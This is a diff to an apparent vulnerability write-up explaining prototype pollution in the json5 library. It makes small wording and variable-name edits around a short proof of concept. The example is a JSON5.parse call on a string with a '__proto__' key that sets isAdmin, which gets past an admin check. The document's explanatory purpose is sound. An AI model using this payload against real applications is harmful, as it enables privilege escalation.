@@ -34,7 +34,7 @@ This vulnerability is prioritized because it combines **high severity** with one
 **Exploitation Scenario**  
 GitHub Advisory has a brilliant **[POC](https://github.com/json5/json5/security/advisories/GHSA-9c47-m6qq-7p4h)** to explain the exploitation scenario.  
 
-But let's try simplify.  
+But let's try to simplify it even further: 
 - Imagine an app that decides what to do based on the user's role, for example an administrative action:
 ```js
 const doSomethingAsAdmin = (user) => {
@@ -48,8 +48,8 @@ const doSomethingAsAdmin = (user) => {
 - An attacker could try exploit Prototype Pollution using the special __proto__ key:
 ```js
 const JSON5 = require('json5');
-const props3 = JSON5.parse('{"foo": "bar", "__proto__": {"isAdmin": true}}');
-doSomethingAsAdmin(props3); 
+const user = JSON5.parse('{"foo": "bar", "__proto__": {"isAdmin": true}}');
+doSomethingAsAdmin(user); 
 // Output: "Doing thing as admin"
 ```
 - In this case, the attacker pollutes the object prototype, making isAdmin resolve to true and bypassing the intended admin check.
